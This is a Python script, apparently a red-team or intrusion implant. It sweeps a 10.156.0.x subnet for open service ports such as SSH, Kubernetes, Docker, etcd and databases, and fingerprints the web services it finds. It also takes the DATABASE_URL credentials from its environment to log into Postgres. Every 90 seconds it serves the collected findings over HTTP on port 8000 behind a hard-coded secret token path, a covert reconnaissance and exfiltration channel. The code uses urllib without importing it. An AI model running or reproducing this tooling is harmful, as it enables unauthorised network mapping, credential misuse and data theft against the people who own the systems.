import json, os, ssl, socket, threading
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}

PORTS = [22,80,443,3000,4646,4647,5432,5601,6379,6443,8000,8080,8443,8500,8501,8502,
         8888,9000,9090,9091,9092,9200,9300,10250,11211,2181,22243,2375,2376,2379,2380,
         26247,27017,33046,2049,10000]

def scan_bridge():
    import concurrent.futures as cf
    self_v4 = "10.156.0.174"
    addrs = [f"10.156.0.{i}" for i in range(2,255) if f"10.156.0.{i}" != self_v4]
    def chk(a):
        ip, port = a
        s = socket.socket(); s.settimeout(0.7)
        try:
            return (ip, port, s.connect_ex((ip, port)) == 0)
        except Exception:
            return (ip, port, False)
        finally:
            try: s.close()
            except Exception: pass
    out = {}
    with cf.ThreadPoolExecutor(max_workers=256) as ex:
        for ip, port, ok in ex.map(chk, [(ip, p) for ip in addrs for p in PORTS]):
            if ok:
                out.setdefault(ip, []).append(port)
    return out

def ident(ip, port, timeout=2):
    try:
        ctx = ssl._create_unverified_context()
        if port in (443, 8443, 3000, 5601, 9200, 9090, 9091, 10000, 6443, 10250):
            u = f"https://{ip}:{port}/"
            op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))
        else:
            u = f"http://{ip}:{port}/"
            op = urllib.request.build_opener()
        req = urllib.request.Request(u, headers={"User-Agent": "rtprobe-id"})
        r = op.open(req, timeout=timeout)
        return {"status": r.status, "server": r.headers.get("Server", ""),
                "head": r.read(120).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        return {"status": e.code, "server": (e.headers or {}).get("Server", ""),
                "head": (e.read(120).decode("utf-8", "replace") if e.fp else "")}
    except Exception as e:
        return {"err": type(e).__name__}

def run_all():
    o = {}
    o["scan"] = scan_bridge()
    o["ident"] = {}
    for ip, ports in (o["scan"] or {}).items():
        for p in ports:
            if p in (80, 443, 3000, 5601, 8000, 8080, 8443, 8888, 9000, 9090, 9091, 9200, 10000, 10250):
                o["ident"][f"{ip}:{p}"] = ident(ip, p)
    # own-cred continuity
    try:
        import psycopg, urllib.parse, hashlib
        u = urllib.parse.urlparse(os.environ.get("DATABASE_URL", ""))
        if u.hostname:
            o["cred"] = {"user": u.username, "host": u.hostname, "port": u.port,
                         "db": u.path.lstrip("/"), "pw_len": len(u.password or "")}
            conn = psycopg.connect(host=u.hostname, port=u.port or 5432, dbname=u.path.lstrip("/"),
                                   user=u.username, password=u.password, sslmode="require", connect_timeout=8)
            cur = conn.cursor(); cur.execute("SELECT version()"); o["pg"] = cur.fetchone()[0][:50]
            cur.close(); conn.close()
    except Exception as e:
        o["pg_err"] = type(e).__name__
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__ + ": " + str(e)[:140]
        threading.Event().wait(90)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

def serve6():
    s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
    s6.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s6.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 1)
    s6.bind(("::", 8000)); s6.listen(32)
    while True:
        c, a = s6.accept()
        try:
            c.settimeout(3); req = c.recv(1024).decode("utf-8", "replace")
            path = req.split(" ")[1] if " " in req else "/"
            if path == "/" + TOKEN:
                body = json.dumps(CACHE, default=str).encode()
                c.send(b"HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: close\r\nContent-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)
            else:
                c.send(b"HTTP/1.1 404 Not Found\r\nConnection: close\r\nContent-Length: 0\r\n\r\n")
        except Exception:
            pass
        finally:
            try: c.close()
            except Exception: pass

threading.Thread(target=loop, daemon=True).start()
threading.Thread(target=serve6, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
